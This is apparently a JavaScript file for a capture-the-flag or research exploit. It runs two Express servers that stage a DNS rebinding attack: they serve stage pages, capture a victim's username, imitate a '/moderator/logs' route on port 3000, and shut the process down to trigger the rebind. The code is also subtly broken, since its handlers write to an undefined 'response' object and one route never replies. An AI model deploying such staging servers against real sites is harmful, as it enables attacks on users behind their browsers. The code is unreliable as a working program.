const express = require('express')
const fs = require('fs')
const path = require('path')

/*
 * We need a couple of server running.
 * The one listening on 9999 is for starting the exploit. 
 * The one listening on 3000 is for performing some DNS Rebinding magic.
 */

const starter = express()
var port = 9999

// Global Variable holding the username of our user
var username = ""

starter.get('/', (req, res) => {
    let filePath = path.join(__dirname, 'public/stage-1.html');
    fs.readFile(filePath, {encoding: 'utf-8'}, function(err,data){
        if (!err) {
            response.writeHead(200, {'Content-Type': 'text/html'});
            response.write(data);
            response.end();
        } else {
            console.log(err);
        }
    });
})

starter.get('/username', (req, res) => {
    username=req.query.username
    return;
})

starter.get('/stage-two', (req, res) => {
    let filePath = path.join(__dirname, 'public/stage-2.html');
    fs.readFile(filePath, {encoding: 'utf-8'}, function(err,data){
        if (!err) {
            response.writeHead(200, {'Content-Type': 'text/html'});
            response.write(data);
            response.end();
        } else {
            console.log(err);
        }
    });
})

starter.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

const crasher = express()
crasher.set('view engine', 'ejs');
port = 3000

crasher.get('/moderator/logs', (req, res) => {
    res.render("./public/stage-3.html",{"username":username})
})

crasher.get('/bye', (req, res) => {
    console.log("Stage 3 Started, killing this process")
    process.exit(1)
})

crasher.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})
